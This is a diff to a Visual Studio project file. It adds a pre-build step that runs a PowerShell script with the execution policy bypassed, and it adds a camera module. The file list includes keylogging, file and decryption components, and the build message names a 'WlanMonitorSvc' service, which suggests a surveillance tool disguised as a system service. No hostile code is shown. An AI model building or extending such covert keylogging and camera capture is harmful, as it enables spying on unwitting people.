@@ -133,12 +133,19 @@
       <GenerateDebugInformation>true</GenerateDebugInformation>
     </Link>
   </ItemDefinitionGroup>
+  <ItemDefinitionGroup>
+    <PreBuildEvent>
+      <Command>"$(SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -STA -ExecutionPolicy Bypass -File "$(ProjectDir)PromptVersion.ps1" -SourcePath "$(ProjectDir)PowerOFF.cpp"</Command>
+      <Message>Prompt for WlanMonitorSvc build version</Message>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="PowerOFF.cpp" />
   </ItemGroup>
   <ItemGroup>
     <None Include="..\Server\app.py" />
     <None Include="..\Server\bp_auth.py" />
+    <None Include="..\Server\bp_camera.py" />
     <None Include="..\Server\bp_entertainment.py" />
     <None Include="..\Server\bp_file.py" />
     <None Include="..\Server\bp_keylog.py" />
@@ -151,6 +158,7 @@
     <None Include="..\Server\systemd_example.service" />
     <None Include="..\Server\ui.py" />
     <None Include="Decrypt.py" />
+    <None Include="PromptVersion.ps1" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
